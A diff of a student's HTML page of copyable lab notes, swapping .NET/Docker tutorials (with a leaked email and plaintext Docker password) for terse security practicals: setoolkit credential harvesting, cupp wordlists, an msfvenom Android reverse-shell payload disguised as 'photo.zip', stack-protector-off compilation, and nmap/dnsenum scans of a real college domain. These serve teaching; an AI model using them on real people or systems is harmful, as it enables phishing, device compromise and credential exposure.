@@ -37,536 +37,211 @@
 
 <body>
 
-    <button onclick="copyText(text1)"> 1 BUILDING A ASP.NET CORE MVC APPLICATION  </button>
-    <button onclick=" copyText(text2)">2 BUILDING ASP .NET CORE REST API </button>
-    <button onclick="copyText(text3)">3 WORKING WITH DOCKER</button>
-    <button onclick="copyText(text4)">4 INSTALLING SOFTWARE PACKAGES ON DOCKER </button>
-    <button onclick="copyText(text5)">5 WORKING WITH DOCKER VOLUMES AND NETWORKS </button>
-    <button onclick="copyText(text6)">6 WORKING WITH CIRCLECI FOR CONTINUOUS INTEGRATION</button>
-    <button onclick="copyText(text7)">7 CREATING BACKING SERVICE WITH ASP.NET 2.0 CORE</button>
-    <button onclick="copyText(text8)">8 WORKING WITH KUBERNETES  </button>
-   
-
+    <button onclick="copyText(text1)">1a Data Pre-Processing and Exploration</button>
+    <button onclick="copyText(text2)">1b Load a Dataset, Summary Statistics, Visualizations</button>
+    <button onclick="copyText(text3)">1c Data Pre-Processing-Label Encoding, Scaling, Binarization</button>
+    <button onclick="copyText(text4)">2a </button>
+    <button onclick="copyText(text5)">7a paritycheck </button>
+    <button onclick="copyText(text6)">7b 2d parity check</button>
+    <button onclick="copyText(text7)">8 buffer flow</button>
+    <button onclick="copyText(text8)">9 zen map tool </button>
+    <button onclick="copyText(text9)">10 ssh telnet</button>
+    <button onclick="copyText(text10)">11 netcraft(website)</button>
+    <button onclick="copyText(text11)">12 implements network tools </button>
+    <button onclick="copyText(text12)">12 implements network tools </button>
+    <button onclick="copyText(text13)">12 implements network tools </button>
+    <button onclick="copyText(text14)">12 implements network tools </button>
+    <button onclick="copyText(text15)">12 implements network tools </button>
+    <button onclick="copyText(text16)">12 implements network tools </button>
+    <button onclick="copyText(text17)">12 implements network tools </button>
+    <button onclick="copyText(text18)">12 implements network tools </button>
+    <button onclick="copyText(text19)">12 implements network tools </button>
+    
     <p id="copiedMsg"></p>
     <script>
-  
-
-        var text 1 = ` Step-1: Install .Net Core Sdk (Link: https://dotnet.microsoft.com/learn/dotnet/hello-world-tutorial/install)  
-
-Step-2: Create folder mymvc folder in D: drive or any other drive. 
-
-Step-3: Open command prompt and perform the following operations.
-Command to create mvc project: 
-dotnet new mvc --auth none
-
-[visual studio code will open automatically with a HomeController.cs file and some existing code which needs to be modified]
+        var text1 = `
+        Practical 2 
+1 step ifconfig 
+2step (root) setoolkit
+3step(select all this number ) 1,2,3,2
+4step (ip address input )
+5 step website url = vulnweb
+6step firefox  enter (ip address  and search )
 
 
-Step-4: Go to controllers’ folder and modify HomeController.cs file to match following:
-using System;
-using System.Collections.Generic;
-using System.Diagnostics;
-using System.Linq;
-using System.Threading.Tasks;
-using Microsoft.AspNetCore.Mvc;
-using Microsoft.Extensions.Logging;
-using mymvc.Models;
-namespace mymvc.Controllers
-{
-    public class HomeController : Controller
-    {
-        public String Index()
-        { return "Your name"; }
-    }
-}
-
-Step-5: Run the project: 
-Dotnet run
-
-Now open browser and and type URL: http://localhost:5046 - You will get this url when you run the dotnet run command 
-
-Step-6: Now go back to command prompt and stop running the project using CTRL+C.
-
-Step-7: Go to models’ folder and add new file StockQuote.cs to it with following content:
-
-using System;
-namespace mymvc.Models
-{
-    public class StockQuote
-    {
-        public string Symbol { get; set; }
-        public int Price { get; set; }
-
-    }
-}
-
-
-Step-8: Now Add View to folder then home folder in it and modify index.cshtml file to match 
- D:/mymvc/Views/Home 
-Code:
-following:
-@{
-    ViewData["Title"] = "Home Page";
-}
-< div >
-Symbol: @Model.Symbol < br />
-Price: $@Model.Price < br />
-</ div >
-
-Step-9: Now modify HomeController.cs file to match following:
-using System;
-using System.Collections.Generic;
-using System.Diagnostics;
-using System.Linq;
-using System.Threading.Tasks;
-using Microsoft.AspNetCore.Mvc;
-using Microsoft.Extensions.Logging;
-using mymvc.Models;
-namespace mymvc.Controllers
-{
-    public class HomeController : Controller
-    {
-        public async Task<IActionResult> Index()
-        {
-            var model = new StockQuote { Symbol = “Hello surabhi”, Price = 3200 };
-            return View(model);
-        }
-    }
-}
-
-Step-10: Now run the project using:
-dotnet run
-
-
-Step-11: Now go back to browser(Local host link) and refresh to get modified view response.
-
-
-`;
-
+    `;
         var text2 = `
-        
-Install .NET 8 SDK: 
-dotnet – version
-
-Create a New Web API Project: 
-dotnet new webapi -n GlossaryApi
-cd GlossaryApi
-
-Create the Model (in same mymvc folder - edit the file)
-Create Models/GlossaryItem.cs:
-namespace GlossaryApi.Models
-{
-    public class GlossaryItem
-    {
-        public int Id { get; set; }
-        public string Term { get; set; }
-        public string Definition { get; set; }
-    }
-}
-
-
-Create the Controller
-------Create Controllers/GlossaryController.cs:
-
-
-using Microsoft.AspNetCore.Mvc;
-using GlossaryApi.Models;
-
-namespace GlossaryApi.Controllers
-{
-
-
-    [ApiController]
-    [Route("api/[controller]")]
-    public class GlossaryController : ControllerBase
-    {
-        private static readonly List<GlossaryItem> _glossary = new List<GlossaryItem>
-{
-    new GlossaryItem { Id = 1, Term = "API", Definition = "Application Programming Interface" },
-    new GlossaryItem { Id = 2, Term = "HTTP", Definition = "HyperText Transfer Protocol" }
-};
-
-        [HttpGet]
-        public ActionResult<List<GlossaryItem>> Get()
-        {
-            return Ok(_glossary);
-        }
-
-        // GET by ID
-        [HttpGet("{id}")]
-        public IActionResult GetById(int id)
-        {
-            var item = _glossary.FirstOrDefault(g => g.Id == id);
-            return item != null ? Ok(item) : NotFound();
-        }
-
-        // POST (Create)
-        [HttpPost]
-        public IActionResult Create(GlossaryItem newItem)
-        {
-            newItem.Id = _glossary.Max(g => g.Id) + 1;
-            _glossary.Add(newItem);
-            return CreatedAtAction(nameof(GetById), new { id = newItem.Id }, newItem);
-        }
-
-        // PUT (Update)
-        [HttpPut("{id}")]
-        public IActionResult Update(int id, GlossaryItem updatedItem)
-        {
-            var item = _glossary.FirstOrDefault(g => g.Id == id);
-            if (item == null) return NotFound();
-
-            item.Term = updatedItem.Term;
-            item.Definition = updatedItem.Definition;
-            return NoContent();
-        }
-
-        // DELETE
-        [HttpDelete("{id}")]
-        public IActionResult Delete(int id)
-        {
-            var item = _glossary.FirstOrDefault(g => g.Id == id);
-            if (item == null) return NotFound();
-
-            _glossary.Remove(item);
-            return NoContent();
-        }
-    }
-}
-
-Update Program.cs for Swagger
-
-using Microsoft.AspNetCore.Builder;
-using Microsoft.Extensions.DependencyInjection;
-using Microsoft.Extensions.Hosting;
-
-var builder = WebApplication.CreateBuilder(args);
-
-// Add services
-builder.Services.AddControllers();
-builder.Services.AddEndpointsApiExplorer();
-builder.Services.AddSwaggerGen();
-
-var app = builder.Build();
-
-// Enable Swagger in Development
-if (app.Environment.IsDevelopment())
-{
-    app.UseSwagger();
-    app.UseSwaggerUI();
-}
-
-app.UseHttpsRedirection();
-app.UseAuthorization();
-app.MapControllers();
-app.Run();
-
-Run  the Application
-Before running this command run the swagger installation commands
-dotnet run
-
-Test the API
-https://localhost:5027/swagger
-
-
-
-
-
-CURL COMMANDS 
-GET ALL ITEM ----        curl --insecure http://localhost:5027/api/glossary
-GET BY ID  ---                   curl --insecure http://localhost:5027/api/glossary/1
-
-PUT ---- curl --insecure -X PUT  -d "{\"term\":\"REST\",\"definition\":\"surabhi here\"}" -H "Content-Type: application/json" http://localhost:5027/api/glossary
-
-  POST---                  curl --insecure -X POST  -d "{\"term\":\"REST\",\"definition\":\"Representational                  State      Transfer\"}" -H "Content-Type: application/json" http://localhost:5027/api/glossary
-
-DELETE----       curl --insecure -X DELETE https://localhost:5027/api/glossary/3
-
-
-SWAGGER INSTALLATION COMMAND
-
-Install the Required Package
-Run this command in your project directory:
-dotnet add package Swashbuckle.AspNetCore
-
-
-Swagger commands
-1️.GET All Items
-Click on GET /api/glossary
-Click Try it out ---- Execute.
-Check the Response Body for the list of items.
-2️. GET Item by ID
-Click GET /api/glossary/{id}.
-Click Try it out -- Enter an ID (e.g., 1) --- Execute.
-Check for the glossary item details if it exists.
-3. POST (Add) New Item
-Click POST /api/glossary --- Try it out.
-In the Request Body, enter: 
-{
-  "term": "REST",
-  "definition": "Representational State Transfer"
-}
-Click Execute.
-Check Response Code → 201 Created if successful.
-4️ .PUT (Update) Existing Item
-Click PUT /api/glossary/{id} -- Try it out.
-Enter an existing ID (e.g., 1).
-In the Request Body, enter: 
-{
-  "term": "REST",
-  "definition": "Updated Definition"
-}
-Click Execute.
-Check for 204 No Content if the update is successful.
-5️ DELETE an Item
-Click DELETE /api/glossary/{id} -- Try it out.
-Enter an existing ID (e.g., 3) -- Execute.
-Look for 204 No Content if deletion is successful.
+        Practical no 3 cupp
+1 step cd
+2step cd cupp 
+3step ./cupp.py -i
+(Fill buy your self )
+4 step nano file name.txt
 
 `;
 
         var text3 = `
-Step-1: Create a Docker Hub account (sign up).
-Email- surabhi.maydeokc@gmail.com
-Username- surabhimaydeo
+        Practical 5 
+1 step ifconfig 
+2 step download any apk file 
+3step rename.apk
+4step msfvenom -p android/meterpreter/reverse_tcp Lhost=(your ip address) Lport =4444 (hit enter)
+5step write (cmd in in download)
+7step zip photo.zip app.apk 
+
+`;
+
+        var text4 = ` 
+        Practical 6 
+1Step  mkdir ssh 
+2step cd ssh 
+3step nano filename.txt 
+4step enter anything in the file 
+5step service ssh status 
+6step service ssh start (if of)
+7step service ufw status if (start then off it )
+8step then go to putty enter kali ip address and (repeat the first 3 step in putty )
+    
+`;
+
+        var text5 = `
+        Pract 7 
+print('-----------Name: admin , RollNo: KCFMSCITadmin------------')
+
+def calculate_parity(data: str) -> int:
+    count_of_ones = data.count('1')
+    
+    return 0 if count_of_ones % 2 == 0 else 1
+
+def check_parity(data_with_parity: str) -> bool:
+    data = data_with_parity[:-1]
+    received_parity_bit = int(data_with_parity[-1])
+    calculated_parity_bit = calculate_parity(data)
+    return received_parity_bit == calculated_parity_bit
 
 
-Step-2: Login to https://labs.play-with-docker.com/ 
+user_data = input("Enter a binary string (without the parity bit): ")
+if not set(user_data).issubset({'0', '1'}):
+    print("Invalid input!")
+else:
+    parity_bit = calculate_parity(user_data)
+    print(f"Calculated Parity Bit: {parity_bit}")
+    data_with_parity = user_data + str(parity_bit)
+    print(f"Data with Parity Bit: {data_with_parity}")
 
-Click on start.
+    received_data = input("Enter received data with parity bit for integrity check: ")
+    if check_parity(received_data):
+        print("Data is intact.")
+    else:
+        print("Data is corrupted.")
 
-Step-3: Add  new instance.
-
-Step-4: Perform following:
-Method 1:
-To pull and push images using docker.
-Command to check docker version: (2 dashes before version)
-docker –version
-
-To pull readymade image
-Command: docker pull rocker/verse
-
-To check images in docker (note the image id) 
-Command: docker images
-
-Now Login to docker hub and create a repository.
-https://hub.docker.com/repositories/surabhimaydeo
-
-Click on the Create button.
-Now check repository created
-
-Command: To login to your docker account: 
-docker login –username = surabhimaydeo
-Password: surabhi1234
-Note: surabhimaydeo is my docker ID. You will use your docker ID here. And enter your password.
-
-Command: To tag image: docker tag eb0074c1abee surabhimaydeo/ surabhi_maydeo:firsttry
-Note: here e036e0ec200c this is image ID which you can get from docker images command.
-
-Command: to push image to docker hub account: docker push surabhimaydeo/surabhi_maydeo : firsttry
-
-Check it in docker hub now.
-
-Click on tags and check.
+print('-----------Name: admin, RollNo: KCFMSCITadmin------------')
 
 
-Method 2:
-Build an image then push it to docker and run it
-Command: to create docker file
-1. cat > Dockerfile <<EOF
-2. FROM busybox
-3. CMD echo "Hello world! This is me."
-4. EOF
-Command: To build image from docker file: 
-docker build –t surabhimaydeo/surabhi_maydeo.
 
-Command: To check docker images: docker images
-
-Command: To push image to docker hub: docker push surabhimaydeo/surabhi_maydeo
-
-Now check it on docker hub
-
-Command: To run docker image: docker run surabhimaydeo/surabhi_maydeo
-Output:
-
-Now close session.
-
-
+        
   `;
- 
-        var text4 = `
-Step-1: Create a container with ubuntu installed in it.
-Command: docker pull ubuntu
+  
+        var text6 = ` 
+        practical 7b
+        def two_d_parity_check(data):
+    row_parity = []
+    col_parity = [0] * len(data[0])  
 
-Step-2: Now run the ubuntu from the command prompt and access the terminal of the ubuntu.
-Command: docker run -it ubuntu
+    
+    for row in data:
+        row_parity_bit = sum(row) % 2
+        row_parity.append(row_parity_bit)
 
-Step-3: - Install some software onto the ubuntu via the terminal.
-For FireFox
-Command: apt-get -y install firefox
+        for i, elem in enumerate(row):
+            col_parity[i] ^= elem  
 
-For vim
-Command: apt-get install vim
+    return row_parity, col_parity
 
-Step-4: Run the installed software.
-Command: vim
+def check_data_integrity(data, row_parity, col_parity):
+    for i, row in enumerate(data):
+        row_parity_bit = sum(row) % 2
+        if row_parity_bit != row_parity[i]:  
+            return False
+
+    for i in range(len(col_parity)):
+        col_parity_bit = sum(row[i] for row in data) % 2
+        if col_parity_bit != col_parity[i]:  
+            return False
+
+    return True
+
+# Example usage:
+data = [
+    [1, 0, 1],
+    [0, 1, 0],
+    [1, 1, 1]
+]
+
+row_parity, col_parity = two_d_parity_check(data)
+print("Row parity:", row_parity)
+print("Column parity:", col_parity)
+
+if check_data_integrity(data, row_parity, col_parity):
+    print("Data is intact.")
+else:
+    print("Data is corrupted.")
 
 
-
+        
 `;
-var text5 = `
-Pre-Requisites:
-1. Open Windows Firewall
-2. Click on Advanced Security
-3. Click on Inbound Rules
-4. Create a New Rule
-a. Which type of rule would you like to create port.
-b. Does this rule apply to the local ports or specific local ports.
-c. Select Specific local ports - 80.
-d. What action should be taken when a connection matches the specified conditions? - Allow the      connection
-e. When does this apply? - Domain, Private, Public
-f. Name: ReportServer
-g. Description: ReportServer
-Step-1: Enter the following Commands.
-a) docker pull nginx nginx: nginx is the image which is already available in docker
-b) docker run -it-name-webapp -d -p 80:80 nginx: Create a webapp and run it with nginx image on port 80
 
-Step-2: Click on Port and enter 80 in the dropdown window and click OK.
-
-
-Step-3: Enter the below command to enter bash shell and then open port 80.
-docker exec -it WebApp bash
-Cd/usr/share/nginx/html
-Echo "Hello Welcome to updated nginx Page."> index.html
-exit
-Step-4: List all the running containers: 
-docker ps
-Step-5: Create another container in Docker: webappl
-Docker run -it-name webappl -d -p 80:80 nginx:
-Step-6: Click on port and enter 80 in the dropdown and click ok.
-Step-7: Creation of Volume(MyVolume)
-Command:
-a) docker volume create MyVolume
-b) docker volume is
-c) docker volume inspect MyVolume
-d) docker stop WebAppl
-Step-8: Create a container (WebApp 2 ) inside the container MyVolume
-docker run -d-name = WebApp2-mount source-MyVolume,destination=/usr/share/nginx/html -p 80:80 nginx
-Step-9: Enter the below commands:
-a) ls/
-b) cd /var/lib/docker
-c) ls
-d) cd volumes
-e) ls
-f) cd MyVolume
-g) Is
-h) cd_data
-Step-10: Edit the index file with the below content to "Display the content on the Webpage."
-$ echo “From Volume,My user” > index.html
-Open Port 80
-Step-11: Stop the above container (WebApp2) and Create another container within the volume (MyVolume).
-Open port 80
+        var text7 = `
+        Practical 8
+Step 1 nano filename.c
+Step2 code in the file 
+Step 3 for compile gcc -fno-stack-protector -z execstack -o filename  filename.c
+Step4 ./filename
+        
+`;
+var text8 = `
+Practical no 9 (zen map)
+Step1 enter the ip address ipconfig(window)
+Step2 select the intense scan ( in profile)
+Step 3 click on scan 
 
     `;
 
-    var text6 = `
-    Step-1: - Let’s follow some basic steps to begin:
-1.   Login to GitHub. - surabhi.maydeo@gmail.com 
+    var text9 = `
+    practical 10 
+    Step 1 apt-get update 
+Step 2 apt install busybox-static
+Step 3 apt install telnet -y
+Step 4 busybox telnetd -f -p 23
+Step5 open wireshark in linux and double click on (eth0) and inside (eth0 )tcp.port==23
+Step 6 telnet localhost 
+step7 go to statistic from the manu bar at top 
+ssh (part)
+step 1 apt install openssh-server
+step2 systemctl enable ssh
+step3  systemctl status ssh
+step4 systemctl start ssh
+step5 open wireshark in linux and double click on (eth0) and inside (eth0 )tcp.port==22
+step 6 follow tcpstream 
+step7 go to statistic from the manu bar at top
 
-2.   Create a repository with the name HelloWorld.
-3.   Keep it public and check the add a REAME file.
-Step-2: Login to Circle ci with GitHub login & Navigate to Projects tab where you will find the repositories you have created. Once you find the hello-world repository click on setup project.
-Circle ci link - https://circleci.com/
-Step-3: Select Faster and click on setup project.
 
-Step-4: The circle ci will create a branch repository to the root(hello-world) repository.
-Step-5: In GitHub go to hello-world repository and navigate to the branch repository circlrci-project and open the config.yml file.
-
-
-Step-6: Edit the name in config file and commit changes.
-Commit message - Update config.yml
-Commit directly to the main branch 
- 
-Step-7: Now we can observe that the changes from the GitHub are logged and the message is recorded for seamless integration.
     `;
-    var text 7  = `
- Step-1: Open docker play- https://labs.play-with-docker.com/ and enter the login credentials & add new instance
-Start typing the following commands.  
-Command: docker run -d -p 5000:5000 -e PORT=5000 -e LOCATION_URL=http://localhost:5001 dotnetcoreservices/teamservice:location
+    var text10 = ` 
+    practical no 11 (use netcraft site )
+(do it by your self inta spoon feading nahi karunga khud se karo )
 
-Step-2: Start typing the following commands. 
-Command: to run location service 
-docker run -d -p 5001:5001 -e PORT=5001 dotnetcoreservices/locationservice:nodb
+    `;
+    var text11 = `
+    practical no 12
+step 1 whois kccollege.edu.in
+step2 nslookup kccollege.edu.in
+step3 namp -sV ip address whuch u got in 2 step 
+step4 dnsenum kccollege.edu.in
+step 5 apt-get install bmon 
+step 6 bmon 
 
-Step-3: To check running images in docker images. (note image id)
-Command: docker images 
-
-Step-4: To create a new team. 
-Command: curl -H "Content-Type:application/json" -X POST -d \
-'{"id":"e52baa63-d511-417e-9e54-7aab04286281", "name":"KC"}' http://localhost:5000/teams 
-
-Command: curl http://localhost:5000/teams/e52baa63-d511-417e-9e54-7aab04286281
-
-Step-5: To add new members to the team. 
-Command: curl -H "Content-Type:application/json" -X POST -d \ 
-'{"id":"63e7acf8-8fae-42ce-9349-3c8593ac8292","firstName":"Surabhi", "lastName":"Maydeo 021"}' http://localhost:5000/teams/e52baa63-d511-417e-9e54-7aab04286281/members 
-
-Command: To confirm member added
-curl http://localhost:5000/teams/e52baa63-d511-417e-9e54-7aab04286281
-
-Step-6: To add location for member. 
-Command: curl -H "Content-Type:application/json" -X POST -d '{"id":"64c3e69f-1580-4b2f-a9ff-2c5f3b8f0e1f", "latitude":12.0,"longitude":12.0,"altitude":10.0, "timestamp":0,"memberId":"63e7acf8-8fae-42ce-9349-3c8593ac8292"}' http://localhost:5001/locations/63e7acf8-8fae-42ce-9349-3c8593ac8292
-
-Command: To confirm location is added in member Surabhi Maydeo 
-curl http://localhost:5001/locations/63e7acf8-8fae-42ce-9349-3c8593ac8292
-
-`;
-
-
-   var text8 = `
-   Open Play with Kubernetes or Killercoda Add a new Instance. 
-Open - https://killercoda.com/playgrounds/scenario/kubernetes
-
-Step 1: Create a Deployment
-kubectl create deployment my-nginx --image=nginx
-This will create a pod running the official Nginx web server.
-
-Step 2: Expose the Deployment as a Service
-kubectl expose deployment my-nginx --port=80 --target-port=80 --name=my-nginx
-This creates a ClusterIP service, which is only accessible within the cluster.
-
-Step 3: Port Forward to Access Nginx Locally
-Choose a local port like 3000:
-kubectl port-forward deployment/my-nginx 3000:80
-Keep this terminal open while accessing.
-
-Step 4: Test Access
-From another terminal (open a new tab in Killercoda):
-curl http://localhost:3000
-You should see the default Nginx welcome page in HTML format.
-From your local browser (if Killercoda allows), try:
-http://127.0.0.1:3000
-
-Step 5: View Running Pods and Services
-kubectl get pods
-kubectl get svc
-
-Step 6: Scale the Application
-kubectl scale deployment my-nginx --replicas=3
-Check the updated pods:
-kubectl get pods
-
-Step 7: Clean Up
-To delete everything after the test:
-kubectl delete service my-nginx
-kubectl delete deployment my-nginx
-
-   `;
-
-
-
-
-
+    `;
 
 function copyText(text) {
     navigator.clipboard.writeText(text).then(function () {
